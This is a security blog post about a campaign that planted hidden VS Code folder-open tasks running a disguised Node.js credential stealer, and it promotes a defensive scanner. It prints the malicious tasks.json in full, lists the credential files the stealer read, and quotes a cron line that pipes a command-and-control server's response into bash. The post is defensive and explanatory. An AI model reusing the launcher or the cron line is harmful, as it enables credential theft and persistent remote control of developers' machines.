# A repo can run a credential stealer when you open it in VS Code

**Published:** 1 November 2026  
**Author:** [Your name]  
**Demo repo:** [link]  
**Scanner:** [link]

> This is the second act of the GitLab leak story. The first post is [GitLab patched the CVE. Your leaked token is still valid.](./2026-11-01-gitlab-patched-the-cve-your-token-is-still-valid.md). This one explains how a stolen token becomes a developer laptop.

---

## The 10-second version

In October 2026, an attacker pushed **72,026 commits** across **22,964 public repositories** in nine days. **17,667** of those repositories received two files:

- `.vscode/tasks.json` — a hidden task that runs when the folder is opened.
- `public/fonts/fa-solid-400.woff2` — not a font. A Node.js credential stealer.

When a developer opened the repo in VS Code and trusted the workspace, the task ran the "font." The script read AWS credentials, npm tokens, `.git-credentials`, SSH keys, Claude and Gemini credentials, and Kubernetes config, then posted them to a command-and-control server and installed a cron job that survived cleanup.

No GitHub Actions workflow was involved. GitHub's workflow hold did not apply. The payload ran on the developer's machine.

This post explains the pattern, why Workspace Trust is not a security boundary, and how to check a repo before you open it. I also built a free scanner for it — `repo-trust` — because the existing secret scanners do not look at `.vscode/tasks.json`.

---

## 1. The attack is a normal-looking repo

The GhostAction/PolinRider campaign did not exploit a VS Code memory-corruption bug. It used the editor's own task system, exactly as designed.

The malicious `.vscode/tasks.json` looked like this:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "node ./public/fonts/fa-solid-400.woff2",
      "isBackground": true,
      "hide": true,
      "presentation": {
        "reveal": "never",
        "echo": false,
        "close": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
```

Every field is doing work:

- **`runOn: folderOpen`** — the task runs automatically when the folder opens.
- **`hide: true` and `reveal: "never"`** — the task does not show up in the normal task list.
- **`echo: false` and `close: true`** — no command is echoed, and the terminal closes immediately.
- **`label: "eslint-check"`** — it looks like a normal lint task.
- **`node ./public/fonts/fa-solid-400.woff2`** — the "font" is a JavaScript file.

VS Code will ask you to trust the workspace the first time. That dialog is the only gate. If you click **Trust**, the task runs.

The attacker only needs one commit to a repo you clone or open. They do not need a workflow, a package install, or a malicious extension.

---

## 2. What the "font" did

The payload in the GhostAction wave was a small Node.js script. According to GitGuardian's analysis, it read:

- `~/.aws/credentials`
- `.pypirc`
- `.npmrc`
- `.git-credentials`
- `.netrc`
- `~/.claude/.credentials.json`
- `~/.gemini/oauth_creds.json`
- `.kube/config`
- SSH private keys
- environment variables matching AWS, Anthropic, OpenAI, GitHub, and generic token prefixes

It posted the data to `193.32.204.199:8080`, then installed:

```cron
*/5 * * * * curl -s -m 10 http://193.32.204.199:8080/c2/$(hostname) | bash  #ghc2
```

That last line matters. **Cleaning the repository does not remove the cron job.** The laptop stays under the attacker's control until someone checks the crontab and rotates the credentials.

A related campaign, **PolinRider**, used the same `folderOpen` launcher with a fake font and a multi-stage loader. It targeted browser sessions, password vaults, and crypto wallets. In one sample, 20 of 22 branches of a repository carried the malicious task.

---

## 3. "Just don't trust the workspace" is not a strategy

VS Code's Workspace Trust is a useful feature. It is not a security boundary.

- Developers trust repos all day. A cloned repo from a colleague, a vendor, or a public project looks normal.
- The malicious task is hidden. The task list does not show it by default.
- The payload runs with the developer's full user permissions. There is no sandbox.
- The trust dialog describes a generic risk, not "this repo will read your AWS keys."
- Workspace Trust itself has been bypassed. VS Code 1.141.1 fixed **three Workspace Trust bypasses**, and a separate one-click bypass that installed an arbitrary extension was reported in September 2026 (MSRC declined a CVE; no fix at the time).

The realistic defense is not "never trust anything." It is:

1. **Inspect the repo's execution surface before you trust it.**
2. **Make the dangerous files visible.**
3. **Assume that if you already opened it, the credentials on that machine are exposed.**

That is what `repo-trust` does.

---

## 4. The GitLab connection

This is not only a GitHub problem, and it is not only a VS Code problem.

The 2026 GitLab wave produced multiple maximum-severity issues:

- **CVE-2026-85706** — CVSS 10.0 path traversal in the repository commits API. Public exploits read `/etc/gitlab/gitlab-secrets.json`, which decrypts CI/CD variables, deploy keys, and integration tokens. It was added to CISA KEV.
- **CVE-2026-97229** — CVSS 10.0 unauthenticated RCE through the CI/CD regex compiler. Added to KEV.
- **CVE-2026-110264** — CVSS 10.0 unauthenticated RCE affecting every GitLab version back to 7.0.
- **The `glimt-` incoming-email token** — an account-wide, non-expiring credential hidden inside a GitLab issue-by-email address. Anyone with the address can push code, run CI, read CI variables, and bypass IP allow-lists and 2FA.

The chain is the same:

> Stolen token → malicious commit → developer opens the repo → credential stealer runs on the laptop.

A server patch does not undo the token exposure. Revoking the token does not remove the malicious commit. Purging the commit does not remove the cron job. The fix has to cover all three layers.

---

## 5. Check a repo before you open it

### Manual checklist (2 minutes)

1. **`.vscode/tasks.json`** — look for `"runOn": "folderOpen"`, `"hide": true`, `"reveal": "never"`, and commands that run `node`, `curl`, `powershell`, `bash`, `python`, or a file with a font/image extension.
2. **"Fonts" and images** — open them in a text editor. If they start with `#!`, `require(`, `import `, or `fetch(`, they are scripts.
3. **`.git/hooks/`** — remove or inspect anything that is not `*.sample`, especially `post-checkout`, `post-merge`, `pre-commit`, and `pre-push`.
4. **`.git/config`** — check `core.fsmonitor`, `core.sshCommand`, `core.editor`, `include.path`, and `url.*.insteadOf`.
5. **`.gitmodules`** — a submodule `update = !command` or an `ext::` URL can execute code.
6. **CI workflows** — look for `curl … | bash`, base64-decoded execution, history greps, `pull_request_target`, `self-hosted` runners, and `secrets: inherit`.

### One command

```bash
npx repo-trust scan .
```

The scanner checks all of the above, plus leaked tokens in the working tree. Add `--history` to scan commits. It is local-first, has no telemetry, and masks every secret in its output.

Example output from the demo repo:

```
CRITICAL  task-folder-open-asset-script
  .vscode/tasks.json:16
  Hidden folder-open task runs a script disguised as an asset
  Task "eslint-check" runs on folder open and executes
  ./public/fonts/fa-solid-400.woff2, which is a script, not a valid font.

CRITICAL  gitlab-incoming-email-token
  README.md:16
  GitLab incoming email token
  Account-wide, non-expiring token hidden inside a GitLab issue-by-email address.
```

The demo repo uses a harmless fake payload. You can clone it and see the detection without exposing anything.

---

## 6. If you already opened it

Do this in order. Do not start with the history rewrite.

1. **Disconnect and contain.** Open the repo in Restricted Mode. Do not run tasks, tests, or scripts.
2. **Check for persistence.**
   ```bash
   crontab -l | grep -i ghc2
   ls -la ~/.node_modules 2>/dev/null
   ```
   Remove the cron entry and any `.npm-ws-runner.js` files you did not create.
3. **Revoke and rotate.** From a clean machine, revoke AWS keys, npm tokens, GitHub/GitLab PATs, SSH keys, and AI-provider keys. Resetting the GitLab incoming email token invalidates every project address for the account.
4. **Remove the payload.** Delete the task and the fake asset from every branch. Do not just revert the commit; revert restores the previous malicious version.
5. **Purge history** only after revocation. Use `git filter-repo` with a backup, force-push all branches and tags, and re-scan every ref. Check forks, mirrors, CI caches, artifacts, wiki pages, issues, and merge request comments.
6. **Audit.** Review recent commits and pipeline runs for actions you did not perform. Check CloudTrail, npm publish logs, and Git provider audit logs.

The full remediation workflow — contain, rotate, purge, verify — is what I am building next. The scanner is the first step.

---

## 7. What this does not solve

I want to be precise about the limits:

- **The scanner is a detector, not a sandbox.** It cannot stop a task from running if you ignore the warning and trust the workspace.
- **It catches known patterns.** A new loader with a different file name or task label may evade it.
- **False positives happen.** Legitimate projects use `folderOpen` tasks. The scanner explains why it flagged something, and you can ignore it.
- **Workspace Trust is still the gate.** The scanner warns before the task runs, but it cannot change VS Code's trust model.
- **A clean scan is not a guarantee.** It means the checks you ran did not find anything, not that the repo is safe.

The honest framing is: **check the repo, then decide.** The goal is to make the dangerous parts visible before you click Trust.

---

## 8. Why I built this

I have been building developer tools for a while, and the pattern in 2026 is clear: the leak is not the end of the incident. It is the beginning.

A stolen token becomes a malicious commit. The malicious commit becomes a developer laptop. The laptop becomes the next supply chain. The existing tools stop at "we found a secret" or "we found a workflow." Nobody owns the last mile: **revoke, rotate, purge, verify, prevent.**

`repo-trust` is the first piece. It is free, open source, and local-first. If it saves you from one bad repo, that is the point.

- **GitHub:** [link]
- **npm:** `npx repo-trust scan .`
- **VS Code extension:** [coming soon]
- **Demo repo:** [link]

If you find a false positive or a new pattern, open an issue. If you want the fix workflow, star the repo and tell me what you need.

---

## References

- GitGuardian, "GhostAction Crosses Paths With PolinRider": https://blog.gitguardian.com/ghostaction-x-polinrider/
- GitGuardian, "The campaign that never stopped: tracking GhostAction": https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/
- Aikido, "Send GitLab an email, push to main": https://www.aikido.dev/blog/gitlab-email-push-to-main
- Rapid7, CVE-2026-85706: https://www.rapid7.com/blog/post/etr-cve-2026-85706-critical-gitlab-path-traversal-exploited-in-the-wild/
- Rapid7, CVE-2026-97229: https://www.rapid7.com/blog/post/etr-cve-2026-97229-critical-unauthenticated-remote-code-execution-in-gitlab/
- GitLab 19.5.1 patch release: https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-5-1-released/
- VS Code 1.141.1 security release: https://code.visualstudio.com/updates/v1_141
- Vibe Coding Security advisories (GhostAction, Reactime, VS Code): https://pranava0x0.github.io/vibe-coding-security/advisories/

---

*Disclosure: I built `repo-trust`. The demo repo uses a harmless fake payload and fake credentials. No live tokens were used or published.*
